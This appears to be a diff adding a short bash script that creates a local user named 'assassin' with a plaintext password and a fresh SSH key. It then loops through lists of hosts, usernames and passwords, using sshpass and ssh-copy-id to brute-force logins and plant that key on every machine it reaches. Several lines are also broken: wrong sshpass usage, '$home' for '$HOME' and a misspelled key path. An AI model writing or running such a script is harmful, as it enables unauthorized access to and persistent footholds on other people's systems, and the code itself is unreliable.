@@ -1,0 +1,35 @@
+#!/bin/bash
+
+
+test(){
+  echo "this is a fucking test!"  # ignore this
+
+}
+
+
+# add new user assassin
+
+user(){
+  useradd -m -p password -s /bin/bash assassin
+  sleep 3
+  su - assassin -c 'ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa'
+  su - assassin -c 'ls -lat $home/.ssh/'
+}
+
+
+# ssh-copy-id over
+
+copy() {
+
+  for host in $(cat hosts.txt)
+  do
+    for user in $(cat user.txt)
+    do
+      for pass in $(cat password.txt)
+      do
+      sshpass -f $pass ssh-copy-id -i /home/assassin/.ssh/ida_rsa.pub $user@$host
+    done
+  done
+  done
+
+}
